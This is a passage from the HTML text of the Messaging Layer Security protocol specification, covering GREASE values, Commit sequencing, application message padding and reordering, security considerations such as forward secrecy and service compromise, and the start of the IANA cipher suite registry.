<p id="section-13.5-2">When generating the following fields, an MLS client <span>SHOULD</span> include a random
selection of values chosen from these GREASE values:<a href="#section-13.5-2">¬∂</a></p>
<ul>
<li id="section-13.5-3.1">
            <code>LeafNode.capabilities.cipher_suites</code><a href="#section-13.5-3.1">¬∂</a>
</li>
          <li id="section-13.5-3.2">
            <code>LeafNode.capabilities.extensions</code><a href="#section-13.5-3.2">¬∂</a>
</li>
          <li id="section-13.5-3.3">
            <code>LeafNode.capabilities.proposals</code><a href="#section-13.5-3.3">¬∂</a>
</li>
          <li id="section-13.5-3.4">
            <code>LeafNode.capabilities.credentials</code><a href="#section-13.5-3.4">¬∂</a>
</li>
          <li id="section-13.5-3.5">
            <code>LeafNode.extensions</code><a href="#section-13.5-3.5">¬∂</a>
</li>
          <li id="section-13.5-3.6">
            <code>KeyPackage.extensions</code><a href="#section-13.5-3.6">¬∂</a>
</li>
          <li id="section-13.5-3.7">
            <code>GroupInfo.extensions</code><a href="#section-13.5-3.7">¬∂</a>
</li>
        </ul>
<p id="section-13.5-4">For the KeyPackage and GroupInfo extensions, the <code>extension_data</code> for GREASE
extensions <span>MAY</span> have any contents selected by the sender, since they will be
ignored by a correctly implemented receiver.  For example, a sender might
populate these extensions with a randomly sized amount of random data.<a href="#section-13.5-4">¬∂</a></p>
<p id="section-13.5-5">Note that any GREASE values added to <code>LeafNode.extensions</code> need to be reflected
in <code>LeafNode.capabilities.extensions</code>, since the LeafNode validation process
described in <a href="#leaf-node-validation">Section 7.3</a> requires that these two fields be
consistent.<a href="#section-13.5-5">¬∂</a></p>
<p id="section-13.5-6">GREASE values <span>MUST NOT</span> be sent in the following fields, because an unsupported
value in one these fields (including a GREASE value) will cause the enclosing
message to be rejected:<a href="#section-13.5-6">¬∂</a></p>
<ul>
<li id="section-13.5-7.1">
            <code>Proposal.proposal_type</code><a href="#section-13.5-7.1">¬∂</a>
</li>
          <li id="section-13.5-7.2">
            <code>Credential.credential_type</code><a href="#section-13.5-7.2">¬∂</a>
</li>
          <li id="section-13.5-7.3">
            <code>GroupContext.extensions</code><a href="#section-13.5-7.3">¬∂</a>
</li>
          <li id="section-13.5-7.4">
            <code>GroupContextExtensions.extensions</code><a href="#section-13.5-7.4">¬∂</a>
</li>
        </ul>
<p id="section-13.5-8">Values reserved for GREASE have been registered in the various
registries in <a href="#iana-considerations">Section 17</a>.  This prevents conflict between GREASE
and real future values.  The following values are reserved in each registry:
<code>0x0A0A</code>, <code>0x1A1A</code>, <code>0x2A2A</code>, <code>0x3A3A</code>, <code>0x4A4A</code>, <code>0x5A5A</code>, <code>0x6A6A</code>, <code>0x7A7A</code>,
<code>0x8A8A</code>, <code>0x9A9A</code>, <code>0xAAAA</code>, <code>0xBABA</code>, <code>0xCACA</code>, <code>0xDADA</code>, and <code>0xEAEA</code>.  (The
value <code>0xFAFA</code> falls within the private use range.) These values <span>MUST</span> only
appear in the fields listed above, and not, for example, in the <code>proposal_type</code>
field of a Proposal.  Clients <span>MUST NOT</span> implement any special processing rules
for how to handle these values when receiving them, since this negates their
utility for detecting extensibility failures.<a href="#section-13.5-8">¬∂</a></p>
<p id="section-13.5-9">GREASE values <span>MUST</span> be handled using normal logic for processing unsupported
values.  When comparing lists of capabilities to identify mutually supported
capabilities, clients <span>MUST</span> represent their own capabilities with a list
containing only the capabilities actually supported, without any GREASE values.
In other words, lists including GREASE values are only sent to other clients;
representations of a client's own capabilities <span>MUST NOT</span> contain GREASE values.<a href="#section-13.5-9">¬∂</a></p>
</section>
</section>
<section id="sequencing">
      <h2 id="name-sequencing-of-state-changes">
<a href="#section-14">14. </a><a href="#name-sequencing-of-state-changes">Sequencing of State Changes</a>
      </h2>
<p id="section-14-1">Each Commit message is premised on a given starting state,
indicated by the <code>epoch</code> field of the enclosing FramedContent.
If the changes implied by a Commit message are made
starting from a different state, the results will be incorrect.<a href="#section-14-1">¬∂</a></p>
<p id="section-14-2">This need for sequencing is not a problem as long as each time a
group member sends a Commit message, it is based on the most
current state of the group.  In practice, however, there is a risk
that two members will generate Commit messages simultaneously
based on the same state.<a href="#section-14-2">¬∂</a></p>
<p id="section-14-3">Applications <span>MUST</span> have an established way to resolve conflicting Commit messages
for the same epoch. They can do this either by preventing conflicting messages
from occurring in the first place, or by developing rules for deciding which
Commit out of several sent in an epoch will be canonical. The approach chosen
<span>MUST</span> minimize the amount of time that forked or previous group states are kept
in memory, and promptly delete them once they're no longer necessary to ensure
forward secrecy.<a href="#section-14-3">¬∂</a></p>
<p id="section-14-4">The generation of Commit messages <span>MUST NOT</span> modify a client's state, since the
client doesn't know at that time whether the changes implied by the Commit
message will conflict with another Commit or not. Similarly, the Welcome
message corresponding to a Commit <span>MUST NOT</span> be delivered to a new
joiner until it's clear that the Commit has been accepted.<a href="#section-14-4">¬∂</a></p>
<p id="section-14-5">Regardless of how messages are kept in sequence, there is a risk that
in a sufficiently busy group, a given member may never
be able to send a Commit message because they always lose to other
members. The degree to which this is a practical problem will depend
on the dynamics of the application.<a href="#section-14-5">¬∂</a></p>
</section>
<section id="application-messages">
      <h2 id="name-application-messages">
<a href="#section-15">15. </a><a href="#name-application-messages">Application Messages</a>
      </h2>
<p id="section-15-1">The primary purpose of handshake messages is to provide an authenticated group
key exchange to clients. In order to protect application messages sent among the
members of a group, the <code>encryption_secret</code> provided by the key schedule is used
to derive a sequence of nonces and keys for message encryption. Every epoch
moves the key schedule forward, which triggers the creation of a new secret
tree, as described in <a href="#secret-tree">Section 9</a>, along with a new set of symmetric
ratchets of nonces and keys for each member.<a href="#section-15-1">¬∂</a></p>
<p id="section-15-2">Each client maintains their own local copy of the key
schedule for each epoch during which they are a group member. They
derive new keys, nonces, and secrets as needed while deleting old
ones as soon as they have been used.<a href="#section-15-2">¬∂</a></p>
<p id="section-15-3">The group identifier and epoch allow a recipient to know which group secrets
should be used and from which <code>epoch_secret</code> to start computing other secrets.
The sender identifier and content type are used to identify which
symmetric ratchet to use from the secret tree. The
<code>generation</code> counter determines how far into the ratchet to iterate in
order to produce the required nonce and key for encryption or decryption.<a href="#section-15-3">¬∂</a></p>
<section id="padding">
        <h3 id="name-padding">
<a href="#section-15.1">15.1. </a><a href="#name-padding">Padding</a>
        </h3>
<p id="section-15.1-1">Application messages <span>MAY</span> be padded to provide some resistance
against traffic analysis techniques over encrypted traffic
<span>[<a href="#CLINIC">CLINIC</a>]</span> <span>[<a href="#HCJ16">HCJ16</a>]</span>.
While MLS might deliver the same payload less frequently across
a lot of ciphertexts than traditional web servers, it might still provide
the attacker enough information to mount an attack. If Alice asks Bob
"When are we going to the movie?", then the answer "Wednesday" could be leaked
to an adversary solely by the ciphertext length.<a href="#section-15.1-1">¬∂</a></p>
<p id="section-15.1-2">The length of the <code>padding</code> field in PrivateMessageContent can be
chosen by the sender at the time of message encryption. Senders may use padding
to reduce the ability of attackers outside the group to infer the size of the
encrypted content.  Note, however, that the transports used to carry MLS
messages may have maximum message sizes, so padding schemes <span>SHOULD</span> avoid
increasing message size beyond any such limits that exist in a given
deployment scenario.<a href="#section-15.1-2">¬∂</a></p>
</section>
<section id="restrictions">
        <h3 id="name-restrictions">
<a href="#section-15.2">15.2. </a><a href="#name-restrictions">Restrictions</a>
        </h3>
<p id="section-15.2-1">During each epoch, senders <span>MUST NOT</span> encrypt more data than permitted by the
security bounds of the AEAD scheme used <span>[<a href="#I-D.irtf-cfrg-aead-limits">CFRG-AEAD-LIMITS</a>]</span>.<a href="#section-15.2-1">¬∂</a></p>
<p id="section-15.2-2">Note that each change to the group through a handshake message will also set a
new <code>encryption_secret</code>. Hence this change <span>MUST</span> be applied before encrypting
any new application message. This is required both to ensure that any users
removed from the group can no longer receive messages and to (potentially)
recover confidentiality and authenticity for future messages despite a past
state compromise.<a href="#section-15.2-2">¬∂</a></p>
</section>
<section id="delayed-and-reordered-application-messages">
        <h3 id="name-delayed-and-reordered-appli">
<a href="#section-15.3">15.3. </a><a href="#name-delayed-and-reordered-appli">Delayed and Reordered Application Messages</a>
        </h3>
<p id="section-15.3-1">Since each application message contains the group identifier, the epoch, and a
generation counter, a client can receive messages out of order. When messages
are received out of order, the client moves the sender ratchet forward to match
the received generation counter. Any unused nonce and key pairs from the ratchet
are potentially stored so that they can be used to decrypt the messages that
were delayed or reordered.<a href="#section-15.3-1">¬∂</a></p>
<p id="section-15.3-2">Applications <span>SHOULD</span> define a policy on how long to keep unused nonce and key
pairs for a sender, and the maximum number to keep. This is in addition to
ensuring that these secrets are deleted according to the deletion schedule
defined in <a href="#deletion-schedule">Section 9.2</a>. Applications <span>SHOULD</span> also define a policy
limiting the maximum number of steps that clients will move the ratchet forward
in response to a new message.  Messages received with a generation counter
that is too much higher than the last message received would then be rejected.
This avoids causing a denial-of-service attack by requiring the recipient to
perform an excessive number of key derivations. For example, a malicious group
member could send a message with <code>generation = 0xffffffff</code> at the beginning of a
new epoch, forcing recipients to perform billions of key derivations unless they
apply limits of the type discussed above.<a href="#section-15.3-2">¬∂</a></p>
</section>
</section>
<section id="security-considerations">
      <h2 id="name-security-considerations">
<a href="#section-16">16. </a><a href="#name-security-considerations">Security Considerations</a>
      </h2>
<p id="section-16-1">The security goals of MLS are described in <span>[<a href="#I-D.ietf-mls-architecture">MLS-ARCH</a>]</span>.
We describe here how the protocol achieves its goals at a high level,
though a complete security analysis is outside of the scope of this
document.  The Security Considerations section of <span>[<a href="#I-D.ietf-mls-architecture">MLS-ARCH</a>]</span>
provides some citations to detailed security analyses.<a href="#section-16-1">¬∂</a></p>
<section id="transport-security">
        <h3 id="name-transport-security">
<a href="#section-16.1">16.1. </a><a href="#name-transport-security">Transport Security</a>
        </h3>
<p id="section-16.1-1">Because MLS messages are protected at the message level, the
confidentiality and integrity of the group state do not depend on
those messages being protected in transit. However, an attacker who
can observe those messages in transit will be able to learn about the
group state, including potentially the group membership (see
<a href="#group-membership">Section 16.4.3</a> below). Such an attacker might also be able to
mount denial-of-service attacks on the group or exclude new members by
selectively removing messages in transit. In order to prevent this
form of attack, it is <span>RECOMMENDED</span> that all MLS messages be carried
over a secure transport such as TLS <span>[<a href="#RFC8446">RFC8446</a>]</span> or QUIC <span>[<a href="#RFC9000">RFC9000</a>]</span>.<a href="#section-16.1-1">¬∂</a></p>
</section>
<section id="confidentiality-of-group-secrets">
        <h3 id="name-confidentiality-of-group-se">
<a href="#section-16.2">16.2. </a><a href="#name-confidentiality-of-group-se">Confidentiality of Group Secrets</a>
        </h3>
<p id="section-16.2-1">Group secrets are partly derived from the output of a ratchet tree. Ratchet
trees work by assigning each member of the group to a leaf in the tree and
maintaining the following property: the private key of a node in the tree is
known only to members of the group that are assigned a leaf in the node's
subtree. This is called the <em>tree invariant</em>, and it makes it possible to
encrypt to all group members except one, with a number of ciphertexts that is
logarithmic in the number of group members.<a href="#section-16.2-1">¬∂</a></p>
<p id="section-16.2-2">The ability to efficiently encrypt to all members except one allows members to
be securely removed from a group. It also allows a member to rotate their
key pair such that the old private key can no longer be used to decrypt new
messages.<a href="#section-16.2-2">¬∂</a></p>
</section>
<section id="confidentiality-of-sender-data">
        <h3 id="name-confidentiality-of-sender-d">
<a href="#section-16.3">16.3. </a><a href="#name-confidentiality-of-sender-d">Confidentiality of Sender Data</a>
        </h3>
<p id="section-16.3-1">The PrivateMessage framing encrypts "sender data" that identifies which group
member sent an encrypted message, as described in <a href="#sender-data-encryption">Section 6.3.2</a>.
As with the QUIC header protection scheme <span>[<a href="#RFC9001">RFC9001</a>], <a href="https://www.rfc-editor.org/rfc/rfc9001#section-5.4">Section 5.4</a></span>, this scheme
is a variant of the HN1 construction analyzed in <span>[<a href="#NAN">NAN</a>]</span>.  A sample of the
ciphertext is combined with a <code>sender_data_secret</code> to derive a key and nonce
that are used for AEAD encryption of the sender data.<a href="#section-16.3-1">¬∂</a></p>
<div id="section-16.3-2">
<pre>(key, nonce) = PRF(sender_data_secret, sample)
encrypted_sender_data =
  AEAD.Seal(key, nonce, sender_data_aad, sender_data)
</pre><p><a href="#section-16.3-2">¬∂</a>
</p></div>
<p id="section-16.3-3">The only differences between this construction and HN1 as described in <span>[<a href="#NAN">NAN</a>]</span>
are that it (1) uses authenticated encryption instead of unauthenticated
encryption and (2) protects information used to derive a nonce instead of the
nonce itself.<a href="#section-16.3-3">¬∂</a></p>
<p id="section-16.3-4">Since the <code>sender_data_secret</code> is distinct from the content encryption key, it
follows that the sender data encryption scheme achieves AE2 security as defined
in <span>[<a href="#NAN">NAN</a>]</span>, and therefore guarantees the confidentiality of the sender data.<a href="#section-16.3-4">¬∂</a></p>
<p id="section-16.3-5">Use of the same <code>sender_data_secret</code> and ciphertext sample more than once risks
compromising sender data protection by reusing an AEAD (key, nonce) pair.  For
example, in many AEAD schemes, reusing a key and nonce reveals the exclusive OR
of the two plaintexts. Assuming the ciphertext output of the AEAD algorithm is
indistinguishable from random data (i.e., the AEAD is AE1-secure in the phrasing
of <span>[<a href="#NAN">NAN</a>]</span>), the odds of two ciphertext samples being identical is roughly
2<sup>-L/2</sup>, i.e., the birthday bound.<a href="#section-16.3-5">¬∂</a></p>
<p id="section-16.3-6">The AEAD algorithms for cipher suites defined in this document all provide this
property. The size of the sample depends on the cipher suite's hash function, but
in all cases, the probability of collision is no more than 2<sup>-128</sup>.
Any future cipher suite <span>MUST</span> use an AE1-secure AEAD algorithm.<a href="#section-16.3-6">¬∂</a></p>
</section>

<section id="authentication">
        <h3 id="name-authentication">
<a href="#section-16.5">16.5. </a><a href="#name-authentication">Authentication</a>
        </h3>
<p id="section-16.5-1">The first form of authentication we provide is that group members can verify a
message originated from one of the members of the group. For encrypted messages,
this is guaranteed because messages are encrypted with an AEAD under a key
derived from the group secrets. For plaintext messages, this is guaranteed by
the use of a <code>membership_tag</code>, which constitutes a MAC over the message, under a
key derived from the group secrets.<a href="#section-16.5-1">¬∂</a></p>
<p id="section-16.5-2">The second form of authentication is that group members can verify a message
originated from a particular member of the group. This is guaranteed by a
digital signature on each message from the sender's signature key.<a href="#section-16.5-2">¬∂</a></p>
<p id="section-16.5-3">The signature keys held by group members are critical to the security of MLS
against active attacks.  If a member's signature key is compromised, then an
attacker can create LeafNodes and KeyPackages impersonating the member; depending on the
application, this can then allow the attacker to join the group with the
compromised member's identity.  For example, if a group has enabled external
parties to join via external commits, then an attacker that has compromised a
member's signature key could use an external Commit to insert themselves into
the group -- even using a "resync"-style external Commit to replace the
compromised member in the group.<a href="#section-16.5-3">¬∂</a></p>
<p id="section-16.5-4">Applications can mitigate the risks of signature key compromise using pre-shared
keys.  If a group requires joiners to know a PSK in addition to authenticating
with a credential, then in order to mount an impersonation attack, the attacker
would need to compromise the relevant PSK as well as the victim's signature key.
The cost of this mitigation is that the application needs some external
arrangement that ensures that the legitimate members of the group have the
required PSKs.<a href="#section-16.5-4">¬∂</a></p>
</section>
<section id="forward-secrecy-and-post-compromise-security">
        <h3 id="name-forward-secrecy-and-post-co">
<a href="#section-16.6">16.6. </a><a href="#name-forward-secrecy-and-post-co">Forward Secrecy and Post-Compromise Security</a>
        </h3>
<p id="section-16.6-1">Forward secrecy and post-compromise security are important security notions for
long-lived MLS groups.  Forward secrecy means that messages sent at a certain
point in time are secure in the face of later compromise of a group member.
Post-compromise security means that messages are secure even if a group member
was compromised at some point in the past.<a href="#section-16.6-1">¬∂</a></p>
<span id="name-forward-secrecy-and-post-com"></span><figure id="figure-29">
          <div id="section-16.6-2.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="176" text-anchor="middle" version="1.1" viewBox="0 0 448 176" width="448">
                <path d="M 152,80 L 152,160" fill="none" stroke="black"></path>
                <path d="M 192,48 L 192,88" fill="none" stroke="black"></path>
                <path d="M 232,80 L 232,160" fill="none" stroke="black"></path>
                <path d="M 8,96 L 144,96" fill="none" stroke="black"></path>
                <path d="M 160,96 L 224,96" fill="none" stroke="black"></path>
                <path d="M 240,96 L 440,96" fill="none" stroke="black"></path>
                <path d="M 8,128 L 144,128" fill="none" stroke="black"></path>
                <path d="M 240,128 L 368,128" fill="none" stroke="black"></path>
                <polygon fill="black" points="448,96 436,90.4 436,101.6" transform="rotate(0,440,96)"></polygon>
                <polygon fill="black" points="376,128 364,122.4 364,133.6" transform="rotate(0,368,128)"></polygon>
                <polygon fill="black" points="200,88 188,82.4 188,93.6" transform="rotate(90,192,88)"></polygon>
                <polygon fill="black" points="16,128 4,122.4 4,133.6" transform="rotate(180,8,128)"></polygon>
                <g>
                  <text x="196" y="36">Compromise</text>
                  <text x="420" y="116">Time</text>
                  <text x="48" y="148">Forward</text>
                  <text x="112" y="148">Secrecy</text>
                  <text x="304" y="148">Post-Compromise</text>
                  <text x="292" y="164">Security</text>
                </g>
              </svg><p><a href="#section-16.6-2.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-29">Figure 29</a>:
<a href="#name-forward-secrecy-and-post-com">Forward Secrecy and Post-Compromise Security</a>
          </figcaption></figure>
<p id="section-16.6-3">Post-compromise security is provided between epochs by members
regularly updating their leaf key in the ratchet tree. Updating their
leaf key prevents group secrets from continuing to be encrypted to
public keys whose private keys had previously been compromised. Note
that sending an Update proposal does not achieve PCS until another
member includes it in a Commit. Members can achieve immediate PCS by
sending their own Commit and populating the <code>path</code> field, as described
in <a href="#commit">Section 12.4</a>. To be clear, in all these cases, the PCS guarantees
come into effect when the members of the group process the relevant
Commit, not when the sender creates it.<a href="#section-16.6-3">¬∂</a></p>
<p id="section-16.6-4">Forward secrecy between epochs is provided by deleting private keys from past
versions of the ratchet tree, as this prevents old group secrets from being
re-derived. Forward secrecy <em>within</em> an epoch is provided by deleting message
encryption keys once they've been used to encrypt or decrypt a message.
Note that group secrets and message encryption keys are shared by the
group.  There is thus a risk to forward secrecy as long as any
member has not deleted these keys. This is a particular risk if a member
is offline for a long period of time. Applications <span>SHOULD</span> have mechanisms
for evicting group members that are offline for too long (i.e., have
not changed their key within some period).<a href="#section-16.6-4">¬∂</a></p>
<p id="section-16.6-5">New groups are also at risk of using previously compromised keys (as with
post-compromise security) if a member is added to a new group via an old
KeyPackage whose corresponding private key has been compromised.  This risk can
be mitigated by having clients regularly generate new KeyPackages and upload
them to the Delivery Service.  This way, the key material used to add a member
to a new group is more likely to be fresh and less likely to be compromised.<a href="#section-16.6-5">¬∂</a></p>
</section>
<section id="uniqueness-of-ratchet-tree-key-pairs">
        <h3 id="name-uniqueness-of-ratchet-tree-">
<a href="#section-16.7">16.7. </a><a href="#name-uniqueness-of-ratchet-tree-">Uniqueness of Ratchet Tree Key Pairs</a>
        </h3>
<p id="section-16.7-1">The encryption and signature keys stored in the <code>encryption_key</code> and
<code>signature_key</code> fields of ratchet tree nodes <span>MUST</span> be distinct from one another.
If two members' leaf nodes have the same signature key, for example, then the
data origin authentication properties afforded by signatures within the group
are degraded.<a href="#section-16.7-1">¬∂</a></p>
<p id="section-16.7-2">Uniqueness of keys in leaf nodes is assured by explicitly checking each leaf node
as it is added to the tree, whether in an Add proposal, in an Update proposal, or in the <code>path</code> field of a
Commit.  Details can be found in Sections <a href="#leaf-node-validation">7.3</a>,
<a href="#proposal-list-validation">12.2</a>, and <a href="#processing-a-commit">12.4.2</a>.  Uniqueness of
encryption keys in parent nodes is assured by checking that the keys in an
UpdatePath are not found elsewhere in the tree (see <a href="#processing-a-commit">Section 12.4.2</a>).<a href="#section-16.7-2">¬∂</a></p>
</section>
<section id="keypackage-reuse">
        <h3 id="name-keypackage-reuse">
<a href="#section-16.8">16.8. </a><a href="#name-keypackage-reuse">KeyPackage Reuse</a>
        </h3>
<p id="section-16.8-1">KeyPackages are intended to be used only once.  That is, once a KeyPackage
has been used to introduce the corresponding client to a group, it <span>SHOULD</span> be
deleted from the KeyPackage publication system.  Reuse of KeyPackages can lead
to replay attacks.<a href="#section-16.8-1">¬∂</a></p>
<p id="section-16.8-2">An application <span>MAY</span> allow for reuse of a "last resort" KeyPackage in order to
prevent denial-of-service attacks.  Since a KeyPackage is needed to add a
client to a new group, an attacker could prevent a client from being added to new
groups by exhausting all available KeyPackages. To prevent such a denial-of-service
attack, the KeyPackage publication system <span>SHOULD</span> rate-limit KeyPackage
requests, especially if not authenticated.<a href="#section-16.8-2">¬∂</a></p>
</section>
<section id="delivery-service-compromise">
        <h3 id="name-delivery-service-compromise">
<a href="#section-16.9">16.9. </a><a href="#name-delivery-service-compromise">Delivery Service Compromise</a>
        </h3>
<p id="section-16.9-1">MLS is designed to protect the confidentiality and integrity of
the group data even in the face of a compromised DS. However, a compromised
DS can still mount some attacks. While it cannot forge messages,
it can selectively delay or remove them. In some cases, this can be
observed by detecting gaps in the per-sender generation counter,
though it may not always be possible to distinguish an attack from message
loss. In addition, the DS can permanently block messages to and from
a group member. This will not always be detectable by other members.
If an application uses the DS to resolve conflicts between
simultaneous Commits (see <a href="#sequencing">Section 14</a>), it is also possible for the
DS to influence which Commit is applied, even to the point of
preventing a member from ever having its Commits applied.<a href="#section-16.9-1">¬∂</a></p>
<p id="section-16.9-2">When put together, these abilities potentially allow a DS to collude
with an attacker who has compromised a member's state to defeat PCS by
suppressing the valid Update and Commit messages from the member that
would lock out the attacker and update the member's leaf to a new,
uncompromised state. Aside from the SenderData.generation value, MLS
leaves loss detection up to the application.<a href="#section-16.9-2">¬∂</a></p>
</section>
<section id="authentication-service-compromise">
        <h3 id="name-authentication-service-comp">
<a href="#section-16.10">16.10. </a><a href="#name-authentication-service-comp">Authentication Service Compromise</a>
        </h3>
<p id="section-16.10-1">Authentication Service compromise is much more serious than compromise
of the Delivery Service. A compromised AS can assert a binding for a
signature key and identity pair of its choice, thus allowing
impersonation of a given user. This ability is sufficient to allow the
AS to join new groups as if it were that user. Depending on the
application architecture, it may also be sufficient to allow the
compromised AS to join the group as an existing user, for instance, as
if it were a new device associated with the same user. If
the application uses a transparency mechanism such as CONIKS
<span>[<a href="#CONIKS">CONIKS</a>]</span> or Key Transparency <span>[<a href="#KT">KT</a>]</span>, then it may be possible for end
users to detect this kind of misbehavior by the AS.  It is also possible to
construct schemes in which the various clients owned by a user vouch
for each other, e.g., by signing each others' keys.<a href="#section-16.10-1">¬∂</a></p>
</section>
<section id="additional-policy-enforcement">
        <h3 id="name-additional-policy-enforceme">
<a href="#section-16.11">16.11. </a><a href="#name-additional-policy-enforceme">Additional Policy Enforcement</a>
        </h3>
<p id="section-16.11-1">The DS and AS may also apply additional policies to MLS operations to obtain
additional security properties. For example, MLS enables any participant to add
or remove members of a group; a DS could enforce a policy that only certain
members are allowed to perform these operations. MLS authenticates all members
of a group; a DS could help ensure that only clients with certain types of
credentials are admitted. MLS provides no inherent protection against denial of
service; a DS could also enforce rate limits in order to mitigate
these risks.<a href="#section-16.11-1">¬∂</a></p>
</section>
<section id="group-fragmentation-by-malicious-insiders">
        <h3 id="name-group-fragmentation-by-mali">
<a href="#section-16.12">16.12. </a><a href="#name-group-fragmentation-by-mali">Group Fragmentation by Malicious Insiders</a>
        </h3>
<p id="section-16.12-1">It is possible for a malicious member of a group to "fragment" the group by
crafting an invalid UpdatePath.  Recall that an UpdatePath encrypts a sequence
of path secrets to different subtrees of the group's ratchet trees.  These path
secrets should be derived in a sequence as described in
<a href="#ratchet-tree-evolution">Section 7.4</a>, but the UpdatePath syntax allows the sender to
encrypt arbitrary, unrelated secrets.  The syntax also does not guarantee that
the encrypted path secret for a given node corresponds to the public
key provided for that node.<a href="#section-16.12-1">¬∂</a></p>
<p id="section-16.12-2">Both of these types of corruption will cause processing of a Commit to fail for
some members of the group.  If the public key for a node does not match the path
secret, then the members that decrypt that path secret will reject the Commit
based on this mismatch.  If the path secret sequence is incorrect at some point,
then members that can decrypt nodes before that point will compute a different
public key for the mismatched node than the one in the UpdatePath, which also
causes the Commit to fail.  Applications <span>SHOULD</span> provide mechanisms for failed
commits to be reported, so that group members who were not able to recognize the
error themselves can reinitialize the group if necessary.<a href="#section-16.12-2">¬∂</a></p>
<p id="section-16.12-3">Even with such an error reporting mechanism in place, however, it is still
possible for members to get locked out of the group by a malformed Commit.
Since malformed Commits can only be recognized by certain members of the group,
in an asynchronous application, it may be the case that all members that could
detect a fault in a Commit are offline.  In such a case, the Commit will be
accepted by the group, and the resulting state will possibly be used as the basis for
further Commits.  When the affected members come back online, they will reject
the first Commit, and thus be unable to catch up with the group. These members
will need to either add themselves back with an external Commit or reinitialize
the group from scratch.<a href="#section-16.12-3">¬∂</a></p>
<p id="section-16.12-4">Applications can address this risk by requiring certain members of the group to
acknowledge successful processing of a Commit before the group regards the
Commit as accepted.  The minimum set of acknowledgements necessary to verify
that a Commit is well-formed comprises an acknowledgement from one member per
node in the UpdatePath, that is, one member from each subtree rooted in the
copath node corresponding to the node in the UpdatePath. MLS does not
provide a built-in mechanism for such acknowledgements, but they can
be added at the application layer.<a href="#section-16.12-4">¬∂</a></p>
</section>
</section>
<section id="iana-considerations">
      <h2 id="name-iana-considerations">
<a href="#section-17">17. </a><a href="#name-iana-considerations">IANA Considerations</a>
      </h2>
<p id="section-17-1">IANA has created the following registries:<a href="#section-17-1">¬∂</a></p>
<ul>
<li id="section-17-2.1">MLS Cipher Suites (<a href="#mls-cipher-suites">Section 17.1</a>)<a href="#section-17-2.1">¬∂</a>
</li>
        <li id="section-17-2.2">MLS Wire Formats (<a href="#mls-wire-formats">Section 17.2</a>)<a href="#section-17-2.2">¬∂</a>
</li>
        <li id="section-17-2.3">MLS Extension Types (<a href="#mls-extension-types">Section 17.3</a>)<a href="#section-17-2.3">¬∂</a>
</li>
        <li id="section-17-2.4">MLS Proposal Types (<a href="#mls-proposal-types">Section 17.4</a>)<a href="#section-17-2.4">¬∂</a>
</li>
        <li id="section-17-2.5">MLS Credential Types (<a href="#mls-credential-types">Section 17.5</a>)<a href="#section-17-2.5">¬∂</a>
</li>
        <li id="section-17-2.6">MLS Signature Labels (<a href="#mls-signature-labels">Section 17.6</a>)<a href="#section-17-2.6">¬∂</a>
</li>
        <li id="section-17-2.7">MLS Public Key Encryption Labels (<a href="#mls-public-key-encryption-labels">Section 17.7</a>)<a href="#section-17-2.7">¬∂</a>
</li>
        <li id="section-17-2.8">MLS Exporter Labels (<a href="#mls-exporter-labels">Section 17.8</a>)<a href="#section-17-2.8">¬∂</a>
</li>
      </ul>
<p id="section-17-3">All of these registries are under the "Messaging Layer Security" group registry heading,
and assignments are made via the Specification Required policy <span>[<a href="#RFC8126">RFC8126</a>]</span>. See
<a href="#de">Section 17.9</a> for additional information about the MLS Designated Experts (DEs).<a href="#section-17-3">¬∂</a></p>
<section id="mls-cipher-suites">
        <h3 id="name-mls-cipher-suites">
<a href="#section-17.1">17.1. </a><a href="#name-mls-cipher-suites">MLS Cipher Suites</a>
        </h3>
<p id="section-17.1-1">A cipher suite is a combination of a protocol version and the set of
cryptographic algorithms that should be used.<a href="#section-17.1-1">¬∂</a></p>
<p id="section-17.1-2">Cipher suite names follow the naming convention:<a href="#section-17.1-2">¬∂</a></p>
<div id="section-17.1-3">
<pre>CipherSuite MLS_LVL_KEM_AEAD_HASH_SIG = VALUE;
</pre><p><a href="#section-17.1-3">¬∂</a>
</p></div>
<p id="section-17.1-4">Where VALUE is represented as a 16-bit integer:<a href="#section-17.1-4">¬∂</a></p>

<table id="table-5">
          <caption><a href="#table-5">Table 5</a></caption>
<thead>
            <tr>
              <th rowspan="1" colspan="1">Component</th>
              <th rowspan="1" colspan="1">Contents</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td rowspan="1" colspan="1">LVL</td>
              <td rowspan="1" colspan="1">The security level (in bits)</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">KEM</td>
              <td rowspan="1" colspan="1">The KEM algorithm used for HPKE in ratchet tree operations</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">AEAD</td>
              <td rowspan="1" colspan="1">The AEAD algorithm used for HPKE and message protection</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">HASH</td>
              <td rowspan="1" colspan="1">The hash algorithm used for HPKE and the MLS transcript hash</td>
            </tr>
            <tr>
              <td rowspan="1" colspan="1">SIG</td>
              <td rowspan="1" colspan="1">The signature algorithm used for message authentication</td>
            </tr>
          </tbody>
        </table>
<p id="section-17.1-7">The columns in the registry are as follows:<a href="#section-17.1-7">¬∂</a></p>
<ul>
<li id="section-17.1-8.1">Value: The numeric value of the cipher suite<a href="#section-17.1-8.1">¬∂</a>
</li>
          <li id="section-17.1-8.2">Name: The name of the cipher suite<a href="#section-17.1-8.2">¬∂</a>
</li>
          <li id="section-17.1-8.3">
            <p id="section-17.1-8.3.1">Recommended: Whether support for this cipher suite is recommended by the IETF.
Valid values are "Y", "N", and "D", as described below.  The default
value of the "Recommended" column is "N".  Setting the Recommended item to "Y"
or "D", or changing an item whose current value is "Y" or "D", requires
Standards Action <span>[<a href="#RFC8126">RFC8126</a>]</span>.<a href="#section-17.1-8.3.1">¬∂</a></p>
<ul>
<li id="section-17.1-8.3.2.1">Y: Indicates that the IETF has consensus that the item is <span>RECOMMENDED</span>. This
only means that the associated mechanism is fit for the purpose for which it
was defined. Careful reading of the documentation for the mechanism is
necessary to understand the applicability of that mechanism. The IETF could
recommend mechanisms that have limited applicability, but it will provide
applicability statements that describe any limitations of the mechanism or
necessary constraints on its use.<a href="#section-17.1-8.3.2.1">¬∂</a>
</li>
              <li id="section-17.1-8.3.2.2">N: Indicates that the item has not been evaluated by the IETF and that the
IETF has made no statement about the suitability of the associated
mechanism. This does not necessarily mean that the mechanism is flawed, only
that no consensus exists. The IETF might have consensus to leave an item
marked as "N" on the basis of it having limited applicability or usage
constraints.<a href="#section-17.1-8.3.2.2">¬∂</a>
</li>
